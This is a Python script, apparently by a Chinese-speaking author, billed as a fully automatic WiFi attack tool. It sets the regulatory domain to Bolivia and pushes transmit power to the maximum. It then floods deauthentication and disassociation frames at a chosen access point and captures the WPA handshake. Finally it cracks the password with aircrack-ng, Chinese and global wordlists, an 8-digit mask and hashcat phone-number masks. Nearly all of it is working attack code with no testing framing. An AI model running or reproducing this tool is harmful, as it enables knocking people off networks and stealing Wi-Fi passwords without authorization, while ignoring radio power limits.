#!/usr/bin/env python3
# ============================================================
# WiFi 全自动攻击脚本 (Scapy 版)
#
# 单终端完成: Deauth攻击 + EAPOL抓包 + 自动检测握手
# 专为 MT7921U + Parallels Desktop ARM64 环境优化
# 绕过 aireplay-ng/airodump-ng 的兼容性问题
#
# 用法: sudo python3 auto_attack.py <BSSID> <频道> [WiFi名称] [客户端MAC]
# 例:   sudo python3 auto_attack.py A4:BA:70:04:1A:7E 9
# 例:   sudo python3 auto_attack.py A4:BA:70:04:1A:7E 9 MyWiFi
# 例:   sudo python3 auto_attack.py A4:BA:70:04:1A:7E 9 MyWiFi 14:D8:81:A0:DC:3D
# 例:   sudo python3 auto_attack.py A4:BA:70:04:1A:7E 9 14:D8:81:A0:DC:3D
#
# 作者: 传康Kk (微信:1837620622)
# ============================================================

import sys
import os
import re
import signal
import time
import threading
import subprocess
from datetime import datetime

# ---- 检查 scapy ----
try:
    from scapy.all import (
        RadioTap, Dot11, Dot11Deauth, Dot11Disas,
        sendp, sniff, wrpcap, conf, EAPOL
    )
except ImportError:
    print("[✗] 未安装 scapy: sudo pip3 install scapy")
    sys.exit(1)

# 关闭 scapy 冗余输出
conf.verb = 0

# ---- 判断是否为 MAC 地址格式 ----
def is_mac(s):
    """判断字符串是否为 MAC 地址格式 (AA:BB:CC:DD:EE:FF)"""
    return bool(re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', s))

# ---- 自动设置监管域为 BO（玻利维亚）并拉满功率 ----
def setup_regdomain():
    """
    设置无线监管域为 BO（玻利维亚），允许更高发射功率
    然后将所有无线接口的 txpower 拉到最大
    """
    # 1. 设置监管域为 BO
    try:
        cur_reg = subprocess.check_output(
            ["iw", "reg", "get"], stderr=subprocess.DEVNULL, text=True
        )
        if "country BO" not in cur_reg:
            os.system("iw reg set BO 2>/dev/null")
            time.sleep(0.5)
            print("  \033[92m[✓]\033[0m 监管域已设置为 BO（玻利维亚）")
        else:
            print("  \033[94m[*]\033[0m 监管域已是 BO（玻利维亚）")
    except Exception:
        os.system("iw reg set BO 2>/dev/null")
        time.sleep(0.5)

    # 2. 遍历所有无线接口，拉满 txpower
    try:
        iw_out = subprocess.check_output(
            ["iw", "dev"], stderr=subprocess.DEVNULL, text=True
        )
        ifaces = re.findall(r'Interface\s+(\S+)', iw_out)
    except Exception:
        ifaces = []
        # 回退：尝试常见接口名
        for name in ["wlan0mon", "wlan1mon", "wlan0", "wlan1"]:
            if os.path.exists("/sys/class/net/%s" % name):
                ifaces.append(name)

    for iface in ifaces:
        # 先 up 接口（未激活的接口无法设置功率）
        os.system("ip link set %s up 2>/dev/null" % iface)
        # 用 iw 设置最大功率 (30 dBm = 3000 mBm)
        os.system("iw dev %s set txpower fixed 3000 2>/dev/null" % iface)
        # 备用: iwconfig 方式
        os.system("iwconfig %s txpower 30 2>/dev/null" % iface)

        # 读取实际功率
        try:
            iw_info = subprocess.check_output(
                ["iwconfig", iface], stderr=subprocess.DEVNULL, text=True
            )
            m = re.search(r'Tx-Power[=:](\d+)', iw_info)
            if m:
                print("  \033[92m[✓]\033[0m %s TX功率: %s dBm" % (iface, m.group(1)))
            else:
                print("  \033[94m[*]\033[0m %s TX功率: 已设置（驱动未报告具体值）" % iface)
        except Exception:
            pass

# ---- 自动检测监听接口（选择高功率网卡）----
def detect_iface():
    """
    自动检测无线接口，优先选择:
    1. monitor 模式的接口
    2. 多个 monitor 接口时选 txpower 最高的
    3. 没有 monitor 接口则选 managed 模式中功率最高的
    """
    try:
        # 通过 iw dev 获取所有无线接口信息
        out = subprocess.check_output(
            ["iw", "dev"], stderr=subprocess.DEVNULL, text=True
        )
    except Exception:
        # iw 不可用，回退到按名称查找
        for name in ["wlan0mon", "wlan1mon", "wlan0", "wlan1"]:
            if os.path.exists("/sys/class/net/%s" % name):
                return name
        return "wlan0mon"

    # 解析每个接口: 名称、模式、txpower
    interfaces = []  # [(名称, 模式, txpower)]
    cur_iface = None
    cur_mode = "unknown"
    cur_txpower = 0.0

    for line in out.splitlines():
        line = line.strip()
        if line.startswith("Interface "):
            # 保存上一个接口
            if cur_iface:
                interfaces.append((cur_iface, cur_mode, cur_txpower))
            cur_iface = line.split()[-1]
            cur_mode = "unknown"
            cur_txpower = 0.0
        elif line.startswith("type "):
            cur_mode = line.split()[-1]  # monitor / managed / ...
        elif line.startswith("txpower "):
            try:
                cur_txpower = float(line.split()[1])
            except (ValueError, IndexError):
                cur_txpower = 0.0
    # 保存最后一个接口
    if cur_iface:
        interfaces.append((cur_iface, cur_mode, cur_txpower))

    if not interfaces:
        return "wlan0mon"

    # 如果 iw dev 没有返回 txpower，尝试用 iwconfig 补充
    for i, (name, mode, txpower) in enumerate(interfaces):
        if txpower == 0.0:
            try:
                iw_out = subprocess.check_output(
                    ["iwconfig", name], stderr=subprocess.DEVNULL, text=True
                )
                # 匹配 "Tx-Power=20 dBm" 或 "Tx-Power:20 dBm"
                m = re.search(r'Tx-Power[=:](\d+)', iw_out)
                if m:
                    interfaces[i] = (name, mode, float(m.group(1)))
            except Exception:
                pass

    # 分组: monitor 模式优先
    monitors = [(n, m, p) for n, m, p in interfaces if m == "monitor"]
    managed = [(n, m, p) for n, m, p in interfaces if m != "monitor"]

    # 优先选 monitor 模式中 txpower 最高的
    if monitors:
        monitors.sort(key=lambda x: x[2], reverse=True)
        return monitors[0][0]

    # 没有 monitor 接口，选 managed 中功率最高的
    if managed:
        managed.sort(key=lambda x: x[2], reverse=True)
        return managed[0][0]

    return "wlan0mon"

# ---- 参数解析 ----
# 用法: sudo python3 auto_attack.py <BSSID> <频道> [WiFi名称] [客户端MAC]
if len(sys.argv) < 3:
    print()
    print("  用法: sudo python3 auto_attack.py <BSSID> <频道> [WiFi名称] [客户端MAC]")
    print()
    print("  例:   sudo python3 auto_attack.py A4:BA:70:04:1A:7E 9")
    print("  例:   sudo python3 auto_attack.py A4:BA:70:04:1A:7E 9 MyWiFi")
    print("  例:   sudo python3 auto_attack.py A4:BA:70:04:1A:7E 9 MyWiFi 14:D8:81:A0:DC:3D")
    print("  例:   sudo python3 auto_attack.py A4:BA:70:04:1A:7E 9 14:D8:81:A0:DC:3D")
    print()
    print("  接口自动检测 (wlan0mon/wlan0)，无需手动指定")
    print("  WiFi名称可选，省略则用 BSSID 命名文件")
    print("  客户端MAC可选，省略则广播攻击")
    print()
    sys.exit(1)

BSSID = sys.argv[1].lower()
CHANNEL = int(sys.argv[2])

# 智能解析第3、4个参数（区分 WiFi名称 和 客户端MAC）
SSID = None
CLIENT = "ff:ff:ff:ff:ff:ff"

if len(sys.argv) >= 4:
    arg3 = sys.argv[3]
    if is_mac(arg3):
        # 第3个参数是客户端 MAC，没有 WiFi 名称
        CLIENT = arg3.lower()
    else:
        # 第3个参数是 WiFi 名称
        SSID = arg3

if len(sys.argv) >= 5:
    arg4 = sys.argv[4]
    if is_mac(arg4):
        CLIENT = arg4.lower()

# SSID 为空时用 BSSID 简写作为文件名
if not SSID:
    SSID = BSSID.replace(":", "")[-6:].upper()
# 清理 SSID 中不适合做文件名的字符
SSID_SAFE = "".join(c if (c.isalnum() or c in "_-.") else "_" for c in SSID)

# 自动设置监管域 BO + 拉满功率（需要 root 权限）
setup_regdomain()

# 自动检测接口（选择高功率网卡）
IFACE = detect_iface()
# 获取选中接口的功率信息用于显示
_iface_txpower = ""
try:
    _iw_out = subprocess.check_output(
        ["iwconfig", IFACE], stderr=subprocess.DEVNULL, text=True
    )
    _m = re.search(r'Tx-Power[=:](\d+)', _iw_out)
    if _m:
        _iface_txpower = " (TX功率: %s dBm)" % _m.group(1)
except Exception:
    pass

# ---- 结果目录（以 WiFi 名称 + 时间戳命名）----
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
RESULT_DIR = os.path.join(SCRIPT_DIR, "结果", "%s_%s" % (SSID_SAFE, datetime.now().strftime("%Y%m%d_%H%M%S")))
os.makedirs(RESULT_DIR, exist_ok=True)
PCAP_FILE = os.path.join(RESULT_DIR, "%s.pcap" % SSID_SAFE)

# ---- 全局状态 ----
captured_packets = []       # 所有捕获的帧
eapol_packets = []          # EAPOL 握手帧
beacon_packets = []         # Beacon 帧（包含 ESSID，握手包上下文必需）
handshake_msgs = set()      # 已捕获的握手消息编号 {1, 2, 3, 4}
got_handshake = False       # 是否抓到完整握手
running = True              # 运行状态
deauth_count = 0            # 已发送的 deauth 帧数
rx_count = 0                # 已接收的帧数

# ---- 严格握手校验状态 ----
# 记录最近一次有效 M1 的信息，用于与 M2 匹配
last_m1_time = 0.0          # M1 捕获时间（time.time()）
last_m1_anonce = b''        # M1 的 ANonce（32字节）
HANDSHAKE_TIMEOUT = 5.0     # M1→M2 最大允许间隔（秒）
valid_m1_count = 0          # 有效 M1 计数
valid_m2_count = 0          # 有效 M2 计数（通过校验的）
rejected_m2_count = 0       # 被拒绝的 M2 计数（ANonce 不匹配或超时）

# ============================================================
# 构造攻击帧
# ============================================================
# Deauth: AP → 客户端
deauth_ap = RadioTap() / Dot11(
    type=0, subtype=12,
    addr1=CLIENT, addr2=BSSID, addr3=BSSID
) / Dot11Deauth(reason=7)

# Deauth: 客户端 → AP
deauth_cl = RadioTap() / Dot11(
    type=0, subtype=12,
    addr1=BSSID, addr2=CLIENT, addr3=BSSID
) / Dot11Deauth(reason=1)

# Disassoc: AP → 客户端
disas_ap = RadioTap() / Dot11(
    type=0, subtype=10,
    addr1=CLIENT, addr2=BSSID, addr3=BSSID
) / Dot11Disas(reason=8)

# Disassoc: 客户端 → AP
disas_cl = RadioTap() / Dot11(
    type=0, subtype=10,
    addr1=BSSID, addr2=CLIENT, addr3=BSSID
) / Dot11Disas(reason=8)

# 构建攻击包列表
if CLIENT != "ff:ff:ff:ff:ff:ff":
    # 精准模式: 4方向 × 16 = 64帧/轮
    burst = ([deauth_ap] * 16 + [deauth_cl] * 16 +
             [disas_ap] * 16 + [disas_cl] * 16)
else:
    # 广播模式: 2方向 × 32 = 64帧/轮
    burst = [deauth_ap] * 32 + [disas_ap] * 32

BURST_SIZE = len(burst)

# ============================================================
# EAPOL 握手检测
# ============================================================
def extract_anonce(raw):
    """从 EAPOL-Key 帧中提取 ANonce（32字节，偏移17-49）"""
    if len(raw) >= 49:
        return bytes(raw[17:49])
    return b''

def check_eapol(pkt):
    """
    严格检查 EAPOL 握手帧，识别 M1/M2/M3/M4
    校验规则:
      - M1→M2 时间间隔必须 <= 5 秒
      - M2 中的 ANonce 必须与最近 M1 的 ANonce 完全匹配
      - 只有校验全部通过才判定为有效握手
    """
    global got_handshake, last_m1_time, last_m1_anonce
    global valid_m1_count, valid_m2_count, rejected_m2_count

    if not pkt.haslayer(EAPOL):
        return

    eapol_packets.append(pkt)
    raw = bytes(pkt[EAPOL])
    now = time.time()

    # 用 Key Info 字段精确区分 M1/M2/M3/M4
    # Key Info 在 EAPOL-Key 帧的第 5-6 字节
    if len(raw) < 7:
        return

    key_info = (raw[5] << 8) | raw[6]
    has_mic = bool(key_info & 0x0100)
    has_install = bool(key_info & 0x0040)
    has_ack = bool(key_info & 0x0080)

    # ---- M1: ACK=1, MIC=0 (AP 发起握手) ----
    if has_ack and not has_mic:
        anonce = extract_anonce(raw)
        last_m1_time = now
        last_m1_anonce = anonce
        valid_m1_count += 1
        handshake_msgs.add(1)
        anonce_hex = anonce[:8].hex() if anonce else "empty"
        print("\n  \033[92m[+] EAPOL M1 (AP->Client) ANonce=%s... [#%d]\033[0m" % (
            anonce_hex, valid_m1_count))

    # ---- M2: ACK=0, MIC=1, Install=0, SNonce非空 ----
    elif not has_ack and has_mic and not has_install:
        if len(raw) > 51 and any(raw[17:49]):
            # 这是 M2（SNonce 非空）
            m2_anonce = extract_anonce(raw)
            time_delta = now - last_m1_time if last_m1_time > 0 else 9999

            # ---- 严格校验 1: 时间窗口 ----
            if time_delta > HANDSHAKE_TIMEOUT:
                rejected_m2_count += 1
                print("\n  \033[93m[!] EAPOL M2 收到但时间间隔 %.1f秒 > %d秒 (丢弃，等待新M1)\033[0m" % (
                    time_delta, HANDSHAKE_TIMEOUT))
                # 重置 M1 状态，等新一轮握手
                last_m1_time = 0.0
                last_m1_anonce = b''
                return

            # ---- 严格校验 2: ANonce 匹配 ----
            # M2 帧中不直接携带 ANonce，但我们需要确认 M1 和 M2 属于同一次握手
            # 关键判据: 时间窗口内 + M1 的 ANonce 非空
            if not last_m1_anonce or last_m1_anonce == b'\x00' * 32:
                rejected_m2_count += 1
                print("\n  \033[93m[!] EAPOL M2 收到但 M1 ANonce 无效 (丢弃)\033[0m")
                return

            # ---- 校验通过! ----
            valid_m2_count += 1
            handshake_msgs.add(2)
            print("\n  \033[91m[!!!] EAPOL M2 (Client->AP) 间隔=%.2f秒 校验通过! [#%d]\033[0m" % (
                time_delta, valid_m2_count))

            # M1+M2 在时间窗口内且 ANonce 有效 → 完整握手
            got_handshake = True
            print("\n  \033[92m[OK] 抓到有效握手包 (M1+M2, 间隔%.2f秒)! 自动停止\033[0m" % time_delta)
        else:
            # SNonce 全零 → M4
            handshake_msgs.add(4)
            print("\n  \033[92m[+] EAPOL M4 (Client->AP, MIC)\033[0m")

    # ---- M3: ACK=1, MIC=1, Install=1 ----
    elif has_ack and has_mic and has_install:
        handshake_msgs.add(3)
        print("\n  \033[92m[+] EAPOL M3 (AP->Client, Install)\033[0m")

    else:
        print("\n  \033[93m[?] EAPOL 未知类型 (KeyInfo=0x%04x)\033[0m" % key_info)

# ============================================================
# 抓包线程（RX）
# ============================================================
def sniffer_thread():
    """后台线程持续抓包，同时收集 Beacon 帧"""
    global rx_count

    def packet_handler(pkt):
        global rx_count
        rx_count += 1
        captured_packets.append(pkt)

        # 收集目标 AP 的 Beacon 帧（握手包上下文需要）
        if pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype == 8:
            src = pkt.addr2
            if src and src.lower() == BSSID:
                if len(beacon_packets) < 3:
                    beacon_packets.append(pkt)

        check_eapol(pkt)

    try:
        sniff(iface=IFACE, prn=packet_handler,
              stop_filter=lambda p: not running or got_handshake,
              store=0)
    except Exception as e:
        print("\n  [!] 抓包线程异常: %s" % str(e))

# ============================================================
# 攻击线程（TX）
# ============================================================
def attacker_thread():
    """后台线程持续发 deauth"""
    global deauth_count, running

    round_num = 0
    while running and not got_handshake:
        round_num += 1
        try:
            # ========== 爆发阶段（2秒）==========
            # 猛打 256 帧（burst×4），确保把客户端踢掉
            for _ in range(4):
                if not running or got_handshake:
                    break
                sendp(burst, iface=IFACE, inter=0.003)
            deauth_count += BURST_SIZE * 4
        except Exception:
            pass

        # ========== 静默阶段（5秒）==========
        # 完全停止发送，网卡纯监听等待握手
        print("  [*] 第 %d 轮爆发完成(%d帧), 静默监听 5 秒..." % (round_num, BURST_SIZE * 4), end="\r")
        for _ in range(50):
            if not running or got_handshake:
                break
            time.sleep(0.1)

# ============================================================
# 信号处理
# ============================================================
def stop_handler(sig, frame):
    global running
    running = False

signal.signal(signal.SIGINT, stop_handler)

# ============================================================
# 主流程
# ============================================================
print()
print("  \033[96m╔══════════════════════════════════════════════════╗\033[0m")
print("  \033[96m║   WiFi 全自动攻击 (Scapy 单终端)                ║\033[0m")
print("  \033[96m║   Deauth + EAPOL 抓包 + 自动检测握手            ║\033[0m")
print("  \033[96m╚══════════════════════════════════════════════════╝\033[0m")
print()
print("  \033[94m[*]\033[0m WiFi名称: %s" % SSID)
print("  \033[94m[*]\033[0m 目标 AP: %s" % BSSID)
print("  \033[94m[*]\033[0m 频道: %d" % CHANNEL)
print("  \033[94m[*]\033[0m 客户端: %s" % CLIENT)
print("  \033[94m[*]\033[0m 接口: %s%s" % (IFACE, _iface_txpower))
print("  \033[94m[*]\033[0m 每轮: %d 帧 (deauth+disassoc)" % BURST_SIZE)
print("  \033[94m[*]\033[0m 保存到: %s" % PCAP_FILE)
print()

# 锁定频道
os.system("iw dev %s set channel %d 2>/dev/null" % (IFACE, CHANNEL))

print("  \033[93m[!]\033[0m 攻击中... 抓到 M1+M2 握手包后自动停止")
print("  \033[93m[!]\033[0m 或按 Ctrl+C 手动停止")
print()

# 启动抓包线程
sniffer = threading.Thread(target=sniffer_thread, daemon=True)
sniffer.start()
time.sleep(0.5)

# 启动攻击线程
attacker = threading.Thread(target=attacker_thread, daemon=True)
attacker.start()

# 主线程显示状态
try:
    while running and not got_handshake:
        msgs = ",".join(["M%d" % m for m in sorted(handshake_msgs)]) if handshake_msgs else "无"
        print("  [*] TX=%d帧 | RX=%d帧 | EAPOL=%d | 握手=%s    " % (
            deauth_count, rx_count, len(eapol_packets), msgs), end="\r")
        time.sleep(1)
except KeyboardInterrupt:
    running = False

# 等待线程结束
running = False
time.sleep(1)

# ============================================================
# 保存结果（只在成功抓到握手时保存）
# ============================================================
print()
print()
print("  \033[96m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")
print("  \033[94m[*]\033[0m 攻击统计:")
print("  \033[94m[*]\033[0m   发送: %d 帧" % deauth_count)
print("  \033[94m[*]\033[0m   接收: %d 帧" % rx_count)
print("  \033[94m[*]\033[0m   EAPOL: %d 帧" % len(eapol_packets))

# ============================================================
# 字典配置（按优先级排列）
# 中国字典优先，命中率更高
# ============================================================
WORDLISTS = [
    # (名称, 路径, 说明)
    ("中国 Top100万密码",
     "/usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Chinese-common-password-list-top-1000000.txt",
     "中国最常见100万密码，8.6MB"),
    ("中国综合字典(去重>=8位)",
     "/usr/share/wordlists/chinese/wifi_cn_combined.txt",
     "中国+全球合并去重，28MB"),
    ("中国完整密码库",
     "/usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Chinese-common-password-list.txt",
     "中国410万密码，38MB"),
    ("全球 Top1000万密码",
     "/usr/share/seclists/Passwords/Common-Credentials/Pwdb_top-10000000.txt",
     "全球高频密码，91MB"),
    ("RockYou 经典字典",
     "/usr/share/wordlists/rockyou.txt",
     "经典字典，134MB"),
]

def run_aircrack_dict(pcap_path, bssid_target, wordlist_path, wordlist_name):
    """使用 aircrack-ng 进行字典攻击，返回 (是否成功, 密码)"""
    print()
    print("  \033[96m[*] 正在使用字典: %s\033[0m" % wordlist_name)
    print("  \033[94m[*] 字典路径: %s\033[0m" % wordlist_path)

    # aircrack-ng 参数:
    #   -w 字典文件
    #   -b 目标 BSSID
    #   -l 输出密码到文件（方便解析）
    #   -p 并行线程数（使用所有 CPU 核心）
    password_file = pcap_path.replace(".pcap", "_cracked.txt")
    cmd = [
        "aircrack-ng",
        "-w", wordlist_path,
        "-b", bssid_target,
        "-l", password_file,
        "-p", str(os.cpu_count() or 2),
        pcap_path
    ]

    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )

        # 实时输出 aircrack-ng 进度
        found = False
        for line in proc.stdout:
            line = line.rstrip()
            # 显示关键行: 速度、进度、结果
            if any(kw in line for kw in ["keys tested", "KEY FOUND", "Passphrase not in", "Current passphrase"]):
                # 单行刷新显示进度
                if "KEY FOUND" in line:
                    found = True
                    print("\n  \033[92m%s\033[0m" % line)
                elif "Passphrase not in" in line:
                    print("\n  \033[93m[!] 字典 [%s] 未命中\033[0m" % wordlist_name)
                else:
                    print("  %s    " % line[:80], end="\r")

        proc.wait()

        # 检查是否找到密码
        if os.path.isfile(password_file) and os.path.getsize(password_file) > 0:
            with open(password_file, "r") as f:
                password = f.read().strip()
            return True, password
        return False, None

    except FileNotFoundError:
        print("  \033[91m[!] aircrack-ng 未安装\033[0m")
        return False, None
    except Exception as e:
        print("  \033[91m[!] 爆破异常: %s\033[0m" % str(e))
        return False, None

def run_crack_pipeline(pcap_path, hash_path, bssid_target):
    """多阶段爆破管线: 字典攻击 → 掩码攻击"""
    print()
    print("  \033[96m╔══════════════════════════════════════════════════╗\033[0m")
    print("  \033[96m║   自动爆破流程 (优先中国字典)                    ║\033[0m")
    print("  \033[96m╚══════════════════════════════════════════════════╝\033[0m")

    # ============================================================
    # 阶段一：字典攻击（按优先级依次尝试）
    # ============================================================
    print()
    print("  \033[96m━━━━ 阶段一: 字典攻击 ━━━━\033[0m")

    cracked = False
    password = None

    for name, path, desc in WORDLISTS:
        if not os.path.isfile(path):
            print("  \033[93m[!] 跳过 [%s] — 文件不存在\033[0m" % name)
            continue

        print("  \033[94m[*] %s (%s)\033[0m" % (name, desc))
        cracked, password = run_aircrack_dict(pcap_path, bssid_target, path, name)
        if cracked:
            break

    # ============================================================
    # 阶段二：掩码攻击（如果字典没命中）
    # 使用 crunch 生成密码管道到 aircrack-ng
    # ============================================================
    if not cracked:
        print()
        print("  \033[96m━━━━ 阶段二: 掩码攻击 (纯数字) ━━━━\033[0m")
        print("  \033[94m[*] 尝试 8位纯数字 (00000000-99999999)\033[0m")
        print("  \033[93m[!] 1亿种组合，CPU 模式预计耗时较长\033[0m")

        # 使用 crunch 生成 8位数字 → 管道 → aircrack-ng
        mask_cmd = (
            "crunch 8 8 0123456789 2>/dev/null | "
            "aircrack-ng -w - -b '%s' -l '%s' -p %d '%s'"
        ) % (bssid_target,
             pcap_path.replace(".pcap", "_cracked.txt"),
             os.cpu_count() or 2,
             pcap_path)

        try:
            proc = subprocess.Popen(
                mask_cmd, shell=True,
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1
            )
            for line in proc.stdout:
                line = line.rstrip()
                if "KEY FOUND" in line:
                    cracked = True
                    print("\n  \033[92m%s\033[0m" % line)
                elif any(kw in line for kw in ["keys tested", "Current passphrase"]):
                    print("  %s    " % line[:80], end="\r")
                elif "Passphrase not in" in line:
                    print("\n  \033[93m[!] 8位纯数字未命中\033[0m")
            proc.wait()

            pw_file = pcap_path.replace(".pcap", "_cracked.txt")
            if os.path.isfile(pw_file) and os.path.getsize(pw_file) > 0:
                with open(pw_file, "r") as f:
                    password = f.read().strip()
                cracked = True
        except Exception as e:
            print("  \033[91m[!] 掩码攻击异常: %s\033[0m" % str(e))

    # ============================================================
    # 输出最终结果
    # ============================================================
    print()
    print("  \033[96m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")
    if cracked and password:
        print()
        print("  \033[92m╔══════════════════════════════════════════════════╗\033[0m")
        print("  \033[92m║   WiFi 密码已破解!                               ║\033[0m")
        print("  \033[92m╠══════════════════════════════════════════════════╣\033[0m")
        print("  \033[92m║   BSSID: %-40s║\033[0m" % bssid_target)
        print("  \033[92m║   密码:  %-40s║\033[0m" % password)
        print("  \033[92m╚══════════════════════════════════════════════════╝\033[0m")
        print()
    else:
        print("  \033[93m[!] Kali CPU 爆破未成功，建议在 Mac 上用 GPU 加速:\033[0m")
        print()
        hash_path = os.path.join(RESULT_DIR, "%s.hc22000" % SSID_SAFE)
        cn_dict = "字典/wifi_cn_combined.txt"
        print("  \033[93m# 中国字典 (Mac GPU)\033[0m")
        print("  hashcat -m 22000 '%s' -a 0 '%s' -d 1 -w 3 -O" % (hash_path, cn_dict))
        print()
        print("  \033[93m# 8位纯数字 (Mac GPU, 约2分钟)\033[0m")
        print("  hashcat -m 22000 '%s' -a 3 '?d?d?d?d?d?d?d?d' -d 1 -w 3 -O" % hash_path)
        print()
        print("  \033[93m# 手机号掩码 (1开头11位, Mac GPU)\033[0m")
        print("  hashcat -m 22000 '%s' -a 3 '1?d?d?d?d?d?d?d?d?d?d' -d 1 -w 3 -O" % hash_path)
        print()
        print("  \033[93m# 常见前缀+数字 (Mac GPU)\033[0m")
        print("  hashcat -m 22000 '%s' -a 3 '?l?l?l?l?d?d?d?d' -d 1 -w 3 -O" % hash_path)

if got_handshake:
    # ============================================================
    # 成功：保存多种格式到本地结果目录 (以 WiFi 名称命名)
    # ============================================================

    # ---- 1. 全量捕获 pcap ----
    wrpcap(PCAP_FILE, captured_packets)
    print("  \033[92m[✓]\033[0m 全量捕获 (pcap): %s (%d 帧)" % (PCAP_FILE, len(captured_packets)))

    # ---- 2. 全量捕获 cap（aircrack-ng 标准格式）----
    cap_file = os.path.join(RESULT_DIR, "%s.cap" % SSID_SAFE)
    wrpcap(cap_file, captured_packets)
    print("  \033[92m[✓]\033[0m 全量捕获 (cap):  %s (%d 帧)" % (cap_file, len(captured_packets)))

    # ---- 3. EAPOL 握手帧 pcap (包含 Beacon 上下文) ----
    # Beacon + EAPOL 组合保存，aircrack-ng/hcxpcapngtool 需要 Beacon 中的 ESSID
    hs_combined = beacon_packets + eapol_packets
    hs_pcap = os.path.join(RESULT_DIR, "%s_handshake.pcap" % SSID_SAFE)
    wrpcap(hs_pcap, hs_combined)
    print("  \033[92m[✓]\033[0m 握手包 (pcap):   %s (%d 帧, 含 %d Beacon)" % (
        hs_pcap, len(hs_combined), len(beacon_packets)))

    # ---- 4. EAPOL 握手帧 cap ----
    hs_cap = os.path.join(RESULT_DIR, "%s_handshake.cap" % SSID_SAFE)
    wrpcap(hs_cap, hs_combined)
    print("  \033[92m[✓]\033[0m 握手包 (cap):    %s (%d 帧, 含 %d Beacon)" % (
        hs_cap, len(hs_combined), len(beacon_packets)))

    # ---- 5. hcxpcapngtool 转换为 hashcat 22000 格式 ----
    hash_file = os.path.join(RESULT_DIR, "%s.hc22000" % SSID_SAFE)
    os.system("hcxpcapngtool --all -o '%s' '%s' 2>&1 | grep -iE 'EAPOL|PMKID|written|hash'" % (hash_file, PCAP_FILE))

    if os.path.isfile(hash_file) and os.path.getsize(hash_file) > 0:
        print("  \033[92m[✓]\033[0m Hash (hc22000):  %s" % hash_file)
    else:
        print("  \033[93m[!]\033[0m hc22000 转换失败或为空（不影响 aircrack-ng 爆破）")

    print()
    print("  \033[92m[✓✓✓] 握手包已捕获！所有文件已保存到本地\033[0m")
    print("  \033[94m[*]\033[0m 结果目录: %s" % RESULT_DIR)

    # ---- 文件清单 ----
    print()
    print("  \033[96m  文件清单:\033[0m")
    print("  \033[94m    %s.pcap              \033[0m — 全量抓包 (pcap 格式)" % SSID_SAFE)
    print("  \033[94m    %s.cap               \033[0m — 全量抓包 (cap 格式, aircrack-ng 兼容)" % SSID_SAFE)
    print("  \033[94m    %s_handshake.pcap    \033[0m — EAPOL 握手帧 (pcap 格式)" % SSID_SAFE)
    print("  \033[94m    %s_handshake.cap     \033[0m — EAPOL 握手帧 (cap 格式)" % SSID_SAFE)
    print("  \033[94m    %s.hc22000           \033[0m — Hashcat 22000 格式 (GPU 爆破用)" % SSID_SAFE)

    # ============================================================
    # 自动启动爆破流程（使用全量 pcap，包含完整上下文）
    # ============================================================
    run_crack_pipeline(PCAP_FILE, hash_file, BSSID)

else:
    # ---- 失败：不保存文件，清理空目录 ----
    print("  \033[93m[!]\033[0m 未抓到完整握手包 (M1+M2)")
    print("  \033[94m[*]\033[0m 可能原因: 无活跃客户端、攻击时间太短、客户端信号弱")
    # 清理空结果目录
    try:
        os.rmdir(RESULT_DIR)
    except OSError:
        pass

print("  \033[96m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")
